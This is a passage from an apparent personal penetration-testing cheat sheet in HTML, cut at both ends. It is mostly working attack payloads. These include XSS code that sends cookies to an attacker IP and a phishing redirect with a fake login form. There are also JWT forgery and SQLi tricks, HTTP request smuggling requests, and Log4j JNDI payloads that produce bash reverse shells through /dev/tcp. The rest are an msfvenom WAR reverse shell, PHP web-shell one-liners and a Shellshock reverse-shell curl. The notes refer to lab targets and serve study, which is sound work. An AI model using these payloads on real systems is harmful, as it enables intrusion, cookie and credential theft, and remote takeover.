</span></span></code></pre></div><p>or</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>/// https://bobbyhadz.com/blog/javascript-create-image-element
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>image</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;img&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 👇️ Local image
</span></span></span><span class=line><span class=cl><span class=c1>// image.setAttribute(&#39;src&#39;, &#39;my-img.png&#39;);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// 👇️ Remote image
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>image</span><span class=p>.</span><span class=nx>setAttribute</span><span class=p>(</span>
</span></span><span class=line><span class=cl>  <span class=s1>&#39;src&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s1>&#39;x&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>image</span><span class=p>.</span><span class=nx>onerror</span> <span class=o>=</span> <span class=kd>function</span> <span class=nx>handleError</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;http://192.168.49.191/c?a=&#34;</span> <span class=o>+</span> <span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=c1>// 👇️ Can set image.src to a backup image here
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>// image.src = &#39;backup-image.png&#39;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=c1>// 👇️ Or hide image
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>// image.style.display = &#39;none&#39;;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>image</span><span class=p>.</span><span class=nx>onload</span> <span class=o>=</span> <span class=kd>function</span> <span class=nx>handleImageLoaded</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;http://192.168.49.191/c?a=&#34;</span> <span class=o>+</span> <span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 👇️ Can set image.src to a backup image here
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// image.src = &#39;backup-image.png&#39;
</span></span></span><span class=line><span class=cl><span class=c1></span>  
</span></span><span class=line><span class=cl>    <span class=c1>// 👇️ Or hide image
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// image.style.display = &#39;none&#39;;
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>box</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;box&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>box</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>image</span><span class=p>);</span>
</span></span></code></pre></div><p><img loading=lazy src=2022-07-25-13-07-03.png alt></p><h3 id=phish-em>Phish em<a hidden class=anchor aria-hidden=true href=#phish-em>#</a></h3><ul><li>xss with</li></ul><p><code>&lt;img src='x' onerror='window.location.href="http://192.168.49.105/login3.html"'></code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;http://192.168.49.105/asd&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;GET&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>h1</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;h3 mb-3 fw-normal&#34;</span><span class=p>&gt;</span>Please sign in<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;form-floating text-dark&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;form-control&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;floatingInput&#34;</span> <span class=na>placeholder</span><span class=o>=</span><span class=s>&#34;name@example.com&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;username&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>label</span> <span class=na>for</span><span class=o>=</span><span class=s>&#34;floatingInput&#34;</span><span class=p>&gt;</span>Username<span class=p>&lt;/</span><span class=nt>label</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;form-floating text-dark&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;password&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;form-control&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;floatingPassword&#34;</span> <span class=na>placeholder</span><span class=o>=</span><span class=s>&#34;Password&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;password&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>label</span> <span class=na>for</span><span class=o>=</span><span class=s>&#34;floatingPassword&#34;</span><span class=p>&gt;</span>Password<span class=p>&lt;/</span><span class=nt>label</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>button</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;w-100 btn btn-lg btn-primary&#34;</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span><span class=p>&gt;</span>Sign in<span class=p>&lt;/</span><span class=nt>button</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span></code></pre></div><h3 id=jwt>JWT<a hidden class=anchor aria-hidden=true href=#jwt>#</a></h3><p><a href=https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens>Hacktricks</a>
<a href=https://www.netsparker.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/>Netsparker JWT attacks</a></p><ul><li>HEADER, PAYLOAD, SIGNATURE <strong><em>Decode from base64</em></strong></li><li>Try setting ALG to &ldquo;none&rdquo; <strong><em>should be small letters and then urlencode ==</em></strong> then remove signature but leave the last <code>.</code></li><li>If you have the public key and the token is using RS256 > change to HS256 <strong><em>Script in /etc</em></strong></li><li>If there&rsquo;s a Key ID or KID in the Header part - test for SQLi or Directory Traversal. <code>"kid":"../../../../dev/null"</code> <strong><em>this will sign the token with dev/null which is empty</em></strong></li><li>Sometimes the output is not in quotes try to add quotes ex output: <code>{"user":admin}</code> make it <code>{"user":"admin"}</code> before encoding to base64 <strong><em>Edit: looks like this only applies in scripting, if done in jwt.io do not add quotes. still need to confirm</em></strong></li><li>try to replace kid value with command execution see Hacktricks link</li><li>From pentesterlab <code>{"typ": "JWT", "alg": "HS256", "kid": "|&lt;command>"}</code> <strong><em>CVE-2017-17405 impacting Ruby Net::FTP</em></strong></li><li>bruteforce jwt secret using john <code>john jwt.token --wordlist=wordlist.txt --format=HMAC-SHA256</code></li><li>SQLi in jwt see Hacktricks link. <code>' UNION SELECT 'ATTACKER';-- -</code> then set the secret to <code>ATTACKER</code></li><li>Sometimes they don&rsquo;t even verify the signature, so just try changing the user to admin.</li><li><code>jku</code> header devs can use public key from URLs inside using the jku header, attackers can host their self signed jwk file. <a href="https://www.youtube.com/watch?v=2mH6Ri7EAq0">Ippsec UniCode video</a></li></ul><h4 id=using-burp>Using Burp<a hidden class=anchor aria-hidden=true href=#using-burp>#</a></h4><ul><li><p>INSTALL <code>JWT editor</code> in burp and try the following</p></li><li><p>alg to none</p></li><li><p>Bruteforce Signing key</p><ul><li>bruteforce weak key <code>hashcat -a 0 -m 16500 &lt;YOUR-JWT> /path/to/jwt.secrets.list</code></li><li>generate new symmetric key use the bruteforced secret replace <code>k</code> value in key with base64 encoded secret</li></ul></li><li><p>Insert <code>jwk</code></p><ul><li>generate an RSA key</li><li>embed jwk</li></ul></li><li><p>Inject <code>jku</code></p><ul><li>generate an rsa key</li><li>copy as public jwk</li><li>host</li><li>edit the header add <code>"jku":"host location"</code></li><li>edit the kid of the jwt to the same one within the public jwk</li><li>sign the jwt</li><li>done</li></ul></li></ul><h3 id=cors-misconfiguration>CORS Misconfiguration<a hidden class=anchor aria-hidden=true href=#cors-misconfiguration>#</a></h3><ul><li>Check for <em>Access-Control-Allow-Origin:</em> and <em>Access-Control-Allow-Credentials:</em> in response.</li><li>Add Origin header in request - try <code>Null</code></li><li>More payloads <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration>PayloadAlltheThings</a></li><li>add <em>Origin:</em> header if it gets reflected in the response <em>Access-Control-Allow-Origin:</em> try <em>offsecscript/cors/cors.html</em></li></ul><h3 id=samesite>Samesite<a hidden class=anchor aria-hidden=true href=#samesite>#</a></h3><p>Some browsers will block a cookie with <code>SameSite=None</code> if the <code>Secure</code> flag is not also set.</p><p><code>Lax</code> - not to send the cookie on cross-site requests. However, the browser will send the cookie during navigation when a user manually enters the URL in the browser or clicks a link to the site</p><p><code>Strict</code> - will only send cookie if the request is same domain with cookie</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>iframe</span> <span class=nx>sandbox</span><span class=o>=</span><span class=s2>&#34;allow-scripts allow-top-navigation allow-forms&#34;</span> <span class=nx>srcdoc</span><span class=o>=</span><span class=s2>&#34;&lt;script&gt;
</span></span></span><span class=line><span class=cl><span class=s2>  var req = new XMLHttpRequest();
</span></span></span><span class=line><span class=cl><span class=s2>  req.onload = reqListener;
</span></span></span><span class=line><span class=cl><span class=s2>  req.open(&#39;get&#39;,&#39;$url/accountDetails&#39;,true);
</span></span></span><span class=line><span class=cl><span class=s2>  req.withCredentials = true;
</span></span></span><span class=line><span class=cl><span class=s2>  req.send();
</span></span></span><span class=line><span class=cl><span class=s2>  function reqListener() {
</span></span></span><span class=line><span class=cl><span class=s2>    location=&#39;$exploit-server-url/log?key=&#39;+encodeURIComponent(this.responseText);
</span></span></span><span class=line><span class=cl><span class=s2>  };
</span></span></span><span class=line><span class=cl><span class=s2>&lt;/script&gt;&#34;</span><span class=o>&gt;&lt;</span><span class=err>/iframe&gt;</span>
</span></span></code></pre></div><h3 id=git-information-leak>Git Information Leak<a hidden class=anchor aria-hidden=true href=#git-information-leak>#</a></h3><ul><li>Check for <code>.git</code> directory</li><li><code>wget -r</code> then <code>git diff</code> <code>git diff HEAD~1 or 2</code> and so on to show previous commit changes</li><li><code>.git</code> might not be accessible but <code>/.git/HEAD</code> or <code>config</code> might be. nice to check.</li><li><code>git log</code></li><li>Don&rsquo;t forget to <code>git init</code></li><li>first 2 characters is directory <code>c3646db7f9c7e6f126c75900fdcce16d50e1da82</code> = <code>/.git/objects/c3/646db7f9c7e6f126c75900fdcce16d50e1da82</code></li><li><code>git cat-file -p c3646db7f9c7e6f126c75900fdcce16d50e1da82</code></li></ul><h3 id=http-request-smuggling>HTTP Request Smuggling<a hidden class=anchor aria-hidden=true href=#http-request-smuggling>#</a></h3><p><a href="https://www.youtube.com/watch?v=CpVGc1N_2KU">portswigger video</a>
<a href=https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn#demo>Albinowax&rsquo; research</a></p><p>Detecting</p><ul><li>Issue an ambiguous request followed by a normal &lsquo;victim&rsquo; request, then observe whether the latter gets an unexpected response. <strong><em>prone to false negatives</em></strong></li></ul><p>If CL.TE the following will cause an observable delay.
If server is in sync this will get rejected OR harmlessly processed
If TE.CL the front end will reject the message without ever forwarding to the backend because of invalid chunk size &lsquo;Q&rsquo;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>POST /about HTTP/1.1
</span></span><span class=line><span class=cl>Host: example.com
</span></span><span class=line><span class=cl>Transfer-Encoding: chunked
</span></span><span class=line><span class=cl>Content-Length: 4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1
</span></span><span class=line><span class=cl>Z
</span></span><span class=line><span class=cl>Q
</span></span></code></pre></div><p>If TE.CL</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>POST /about HTTP/1.1
</span></span><span class=line><span class=cl>Host: example.com
</span></span><span class=line><span class=cl>Transfer-Encoding: chunked
</span></span><span class=line><span class=cl>Content-Length: 6
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>X
</span></span></code></pre></div><ul><li>ALWAYS test for CL.TE first if we do TE.CL and the server is CL.TE this will poison the backend and potentially harming legitimate users.</li><li>Disable in Burp > Repeater > Update Content-Length
Exploiting</li></ul><p>If CL.TE</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>POST /about HTTP/1.1
</span></span><span class=line><span class=cl>Host: example.com
</span></span><span class=line><span class=cl>Transfer-Encoding: chunked
</span></span><span class=line><span class=cl>Content-Length: 6
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>X
</span></span></code></pre></div><ul><li>to exploit replace X with :</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>GET /404 HTTP/1.1
</span></span><span class=line><span class=cl>X`
</span></span></code></pre></div><p>IF TE.CL</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>POST / HTTP/1.1
</span></span><span class=line><span class=cl>Host: your-lab-id.web-security-academy.net
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Content-length: 4
</span></span><span class=line><span class=cl>Transfer-Encoding: chunked
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>5c
</span></span><span class=line><span class=cl>GPOST / HTTP/1.1
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Content-Length: 15
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>x=1
</span></span><span class=line><span class=cl>0
</span></span></code></pre></div><h2 id=ftp-1>FTP<a hidden class=anchor aria-hidden=true href=#ftp-1>#</a></h2><ul><li>FTP SSL? <code>openssl s_client -connect &lt;ip>:&lt;port> -starttls ftp</code></li><li>lftp</li></ul><pre tabindex=0><code>lftp
set ftp:ssl-force true
set ssl:verify-certificate no
connect &lt;ip&gt;
username
</code></pre><h2 id=nfs>NFS<a hidden class=anchor aria-hidden=true href=#nfs>#</a></h2><ul><li>showmount -e <code>ip</code></li><li>mount <code>10.10.10.10:/share</code></li></ul><h2 id=serializations>Serializations<a hidden class=anchor aria-hidden=true href=#serializations>#</a></h2><h3 id=php-1>PHP<a hidden class=anchor aria-hidden=true href=#php-1>#</a></h3><p>[SnoopySec]
(<a href=https://snoopysecurity.github.io/web-application-security/2021/01/08/02_php_object_injection_exploitation-notes.html>https://snoopysecurity.github.io/web-application-security/2021/01/08/02_php_object_injection_exploitation-notes.html</a>)</p><ul><li>Look for <code>unserialize()</code></li><li>Adding Tilde(~) when requesting PHP might show the source code</li><li>look for _destruct() or _wakeup() <a href=https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection>Owasp</a></li></ul><h3 id=java>Java<a hidden class=anchor aria-hidden=true href=#java>#</a></h3><ul><li>serialized object often is encoded with these as the beginning characters <code>ac ed</code> for hex or <code>rO0</code> for base64</li><li>look for <code>readObject()</code> method used to read and deserialize data from an <code>InputStream</code></li></ul><h2 id=log4j>Log4j<a hidden class=anchor aria-hidden=true href=#log4j>#</a></h2><ul><li><code>java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "https://c6c9-202-89-151-235.ngrok.io:8888/log4jrce"</code></li><li><code>${jndi:ldap://10.10.14.2:1337/a}</code></li><li><a href=https://github.com/pimps/ysoserial-modified>ysoserial-modified</a><ul><li><code>java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.6/9002 0>&1' > ~/htb/logforge/ysoserial.ser</code> <strong><em>Creates a serialized payload</em></strong></li></ul></li><li><a href=https://github.com/pimps/JNDI-Exploit-Kit>JNDI-exploit-kit</a><ul><li><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.6:1389 -P ~/htb/logforge/ysoserial.ser</code> <strong><em>Listens to port 1389 then sends ysoserial.ser</em></strong></li><li>after running ysoserial-modified we will get links for different versions for jdk to try out. <code>${jndi:ldap://10.10.14.6:1389/vojbuj}</code></li></ul></li><li><code>${jndi:ldap://10.10.14.2:1337/${sys:java.class.path} or ${java:version} or ${java:os}}</code> <strong><em>or can be replaced with &mldr;. to do nested thingy</em></strong></li><li>Using JRMPListener to send CommonsCollections <code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1337 CommonsCollections5 "**_CMD_**"</code> **_this will set up a listener listening on port 1337. send your payload <code>${jndi:rmi://10.10.10.10:1337/a}</code> and should receive something.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>Log4jRCE</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>static</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>String</span> <span class=o>[]</span> <span class=n>cmd</span><span class=o>={</span><span class=s>&#34;touch&#34;</span><span class=o>,</span> <span class=s>&#34;/tmp/TEST&#34;</span><span class=o>};</span>
</span></span><span class=line><span class=cl>            <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>Runtime</span><span class=o>.</span><span class=na>getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=n>cmd</span><span class=o>).</span><span class=na>waitFor</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span><span class=k>catch</span> <span class=o>(</span><span class=n>Exception</span> <span class=n>e</span><span class=o>){</span>
</span></span><span class=line><span class=cl>            <span class=n>e</span><span class=o>.</span><span class=na>printStackTrace</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></div><h2 id=apache>Apache<a hidden class=anchor aria-hidden=true href=#apache>#</a></h2><ul><li>Apache on 80 Tomcat on 8080</li><li>encoding of .. = %252e%252e</li></ul><h3 id=tomcat>Tomcat<a hidden class=anchor aria-hidden=true href=#tomcat>#</a></h3><p><a href=https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat>Hacktricks</a></p><ul><li>access manager bypass <code>&lt;ip>/whatever/..;/manager/html</code></li><li><code>msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.14.2 LPORT=9001 -f war -o hyst.war</code></li><li><code>/manager/html/expire?path=/</code> <strong><em>0xdf used this to test for log4j using Post and jndi payload as body</em></strong></li></ul><h2 id=one-liners>One-Liners<a hidden class=anchor aria-hidden=true href=#one-liners>#</a></h2><ul><li><code>&lt;?php system($_REQUESTS['hyst']); ?></code></li><li><code>&lt;?php system($_GET["cmd"]);?></code></li><li><code>&lt;?php print exec('command'); ?></code></li><li><code>&lt;?php echo file_get_contents('/home/carlos/secret'); ?></code></li></ul><h2 id=shellshock>ShellShock<a hidden class=anchor aria-hidden=true href=#shellshock>#</a></h2><ul><li>To detect <code>nmap 10.10.10.56 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh</code></li><li><code>() { :;}; echo; **_CMD_**</code> CMD SHOULD BE ABSOLUTE PATH <code>/usr/bin/whoami</code></li><li>Echo is used to add a blank space between headers and body output</li><li>Try in User-Agent or Cookie</li><li><code>curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "bash -i >& /dev/tcp/10.10.14.2/9001 0>&1"' http://10.10.10.56/cgi-bin/user.sh</code></li></ul><h2 id=c-app--binaries>C app / binaries<a hidden class=anchor aria-hidden=true href=#c-app--binaries>#</a></h2><ul><li>Use gdb / strace</li><li>crash the app then have a look at <code>/var/crashes</code> use <code>apport-unpack</code></li><li><a href="https://www.youtube.com/watch?v=sW10TlZF62w">Node Ippsec</a></li><li><code>gdb ./binary</code><ul><li><code>layout asm</code></li><li>create a breakpoint <code>break *(main+103)</code></li><li><code>run</code></li><li>jump to what ever <code>jump *(main+109)</code></li></ul></li></ul><h2 id=gpgpgpasc>GPG/PGP/ASC<a hidden class=anchor aria-hidden=true href=#gpgpgpasc>#</a></h2><ul><li><code>gpg2john test.asc > hash</code></li><li><code>john --format=gpg hash --wordlist=rockyou.txt</code></li><li><code>gpg --import &lt;file.asc></code></li><li><code>gpg -d &lt;creds.gpg></code></li></ul><h2 id=cbc-mac>CBC-MAC<a hidden class=anchor aria-hidden=true href=#cbc-mac>#</a></h2><ul><li><strong><em>IV</em></strong> is set as a cookie in response after logging in</li></ul><h2 id=graphiql>GraphiQL<a hidden class=anchor aria-hidden=true href=#graphiql>#</a></h2><ul><li>Look for <strong><em>/graphql</em></strong> enpoints - might show web based IDE - or convert the following to proper json and use burp - replace newline with \n? and then insert it to query part of the post body.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>query</span><span class=w> </span><span class=n>IntrospectionQuery</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>__schema</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>queryType</span><span class=w> </span><span class=err>{</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mutationType</span><span class=w> </span><span class=err>{</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>subscriptionType</span><span class=w> </span><span class=err>{</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>types</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=p>...</span><span class=n>FullType</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>directives</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>description</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>args</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>...</span><span class=n>InputValue</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>locations</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>fragment</span><span class=w> </span><span class=n>FullType</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=n>__Type</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>kind</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>description</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>fields</span><span class=p>(</span><span class=n>includeDeprecated</span><span class=p>:</span><span class=w> </span><span class=k>true</span><span class=p>)</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>description</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>args</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=p>...</span><span class=n>InputValue</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>type</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=p>...</span><span class=n>TypeRef</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>isDeprecated</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>deprecationReason</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>inputFields</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>...</span><span class=n>InputValue</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>interfaces</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>...</span><span class=n>TypeRef</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>enumValues</span><span class=p>(</span><span class=n>includeDeprecated</span><span class=p>:</span><span class=w> </span><span class=k>true</span><span class=p>)</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>description</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>isDeprecated</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>deprecationReason</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>possibleTypes</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>...</span><span class=n>TypeRef</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>}</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>}</span><span class=w>   
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>fragment</span><span class=w> </span><span class=n>InputValue</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=n>__InputValue</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>description</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>type</span><span class=w> </span><span class=err>{</span><span class=w> </span><span class=p>...</span><span class=n>TypeRef</span><span class=w> </span><span class=err>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>defaultValue</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>}</span><span class=w>     
</span></span></span><span class=line><span class=cl><span class=w>      
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>fragment</span><span class=w> </span><span class=n>TypeRef</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=n>__Type</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>kind</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>name</span><span class=w>
